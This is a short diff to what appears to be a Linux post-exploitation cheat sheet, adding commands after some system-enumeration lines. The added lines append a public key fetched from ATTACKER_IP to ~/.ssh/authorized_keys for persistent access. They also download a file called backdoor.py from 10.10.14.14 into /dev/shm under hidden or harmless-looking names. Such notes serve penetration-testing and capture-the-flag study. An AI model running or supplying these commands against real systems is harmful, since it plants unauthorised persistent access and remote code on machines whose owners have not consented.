@@ -15,6 +15,14 @@ cat /etc/issue
 cat /etc/*-release
 cat /etc/release
 cat /proc/version
+
+# Add public key to authorized keys
+curl https://ATTACKER_IP/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
+
+# Download program in RAM
+wget 10.10.14.14:8000/backdoor.py -O /dev/shm/.rev.py
+wget 10.10.14.14:8000/backdoor.py -P /dev/shm
+curl 10.10.14.14:8000/backdoor.py -o /dev/shm/nothing_special.py
 ```
 
 Search for useful binaries:
